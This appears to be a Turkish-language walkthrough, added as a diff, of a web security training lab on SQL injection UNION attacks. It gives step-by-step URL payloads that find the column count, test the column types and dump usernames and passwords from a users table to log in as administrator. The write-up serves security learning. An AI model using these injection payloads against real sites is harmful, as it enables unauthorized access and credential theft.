@@ -1,0 +1,17 @@
+LAB: SQL injection UNION attack, retrieving data from other tables
+
+1 - Herhangi bir kategoriyi seçiyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=Corporate+gifts
+
+2 - Sütun sayısını bulmak için category parametresinin değerini Corporate+gifs' ORDER BY 1 ile değiştiriyoruz.
+1'i arttırarak hata almaya çalışıyor. Hata almadan en son önceki değer bize sütun sayısını verir.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=Corporate+gifts%27ORDER%20BY%202--
+
+3 - Sütunların türünü bulmak için '+UNION+SELECT+'abc','def'-- payload ını kullanıyoruz.
+Hata vermeyerek bize iki sütununda string türünde olduğunu söylüyor.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=%27+UNION+SELECT+%27abc%27,%27def%27--
+
+4 - username ve password sütunlarınındaki değerleri yazdırmak için.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=%27+UNION+SELECT+username,+password+FROM+users--
+
+5 - Administrator kullanıcısı ile giriş yapınca oda çözülüyor.
